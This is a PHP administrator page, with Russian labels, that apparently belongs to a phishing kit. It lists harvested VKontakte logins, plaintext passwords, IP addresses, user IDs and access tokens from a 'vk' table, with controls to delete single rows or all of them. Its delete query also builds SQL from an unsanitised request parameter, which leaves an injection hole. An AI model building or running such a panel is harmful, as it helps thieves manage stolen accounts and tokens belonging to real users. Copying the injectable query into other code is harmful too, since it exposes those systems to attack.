<?
	session_start();
	header("Content-Type: text/html; charset=utf-8");
include('config.php');
	
	if(($_REQUEST['login'] == $adUser['login']) and ($_REQUEST['password'] == $adUser['password'])) {
		$_SESSION['login'] = $adUser['login'];
		$_SESSION['password'] = $adUser['password'];
		exit('<meta http-equiv="refresh" content="0; url=/admin.php">');
	}
	
	function signNew() {
		$_SESSION['sign'] = md5(time());
	}
	$db = mysql_connect($config['host'], $config['user'], $config['pass']);
	mysql_select_db($config['db'], $db);
	mysql_query('SET NAMES utf8', $db);          
	mysql_query('SET CHARACTER SET utf8', $db);  
	mysql_query('SET COLLATION_CONNECTION="utf8"', $db);
	?>
<!DOCTYPE html>
<html>
	<head>
		<meta name="viewport" content="initial-scale=1.0, width=device-width">
		<meta http-equiv="content-type" content="text/html; charset=utf-8" />
		<meta http-equiv="X-UA-Compatible" content="IE=edge" />

		<title>Администратор</title>
		
		<link href="https://fonts.googleapis.com/css?family=Open+Sans:300,300i,400,400i,600,600i,700,700i,800,800i&amp;subset=cyrillic" rel="stylesheet">
		<link type="text/css" rel="stylesheet" href="css/panel.css">
			
	</head>
	<body>
	<?
	if(($_SESSION['login'] == $adUser['login']) and ($_SESSION['password'] == $adUser['password'])) {
		if($_REQUEST['sign'] == $_SESSION['sign']) {
			$tp = $_REQUEST['tp'];
			
			if($tp == 'all') {
				$result = mysql_query("DELETE FROM `vk`");
			} else if($tp == 'del') {
				$result = mysql_query("DELETE FROM `vk` WHERE `id`='" . $_REQUEST['id'] . "'");
			}
					
			signNew();
		}
	?>
	<form action='/admin.php' method="post">
		<input type="text" value='<?=$_SESSION['sign']?>' name='sign'>
		<input type="text" value='all' name='tp'>
	<br>
		<button type='submit' class='centB'>Очистить</button>
	</form>
	<table style="width:1000px;">
			<tr class='thead' style="font-weight:bold">
				<td>№</td>
				<td>Логин</td>
				<td>Пароль</td>
				<td>IP</td>
				<td>ID</td>
				<td>Token</td>
				<td>Del</td>
			</tr>
	<?
		$_list = mysql_query("SELECT * FROM `vk` ORDER BY `id` DESC");
						
		while($LIST = mysql_fetch_assoc($_list)){
	?>
			<tr class='tbody'>
				<td><?=$LIST['id']?></td>
				<td><?=$LIST['number']?></td>
				<td><?=$LIST['password']?></td>
				<td><?=$LIST['ip']?></td>
				<td><?=$LIST['uid']?></td>
				<td><input type="text" value="<?=$LIST['token']?>"></td>
				<td>
	<form action='/admin.php' method="post">
		<input type="text" value='<?=$_SESSION['sign']?>' name='sign'>
		<input type="text" value='del' name='tp'>
		<input type="text" value='<?=$LIST['id']?>' name='id'>
	
		<button type='submit'>Удалить</button>
	</form>
				
				</td>
			</tr>
	
	<?
		}
	?>
	</table>
	<?
	} else {
	?>
		<form action='/admin.php' class='auth' method='post'>
			<div class='head'>Авторизация</div>
			<div class='text'>Логин</div>
			<input type='text' name='login'>
			<div class='text'>Пароль</div>
			<input type='password' name='password'>
			<input type='submit' value='Авторизоваться'>
		</form>
	<?
	}
	?>
	</body>
</html>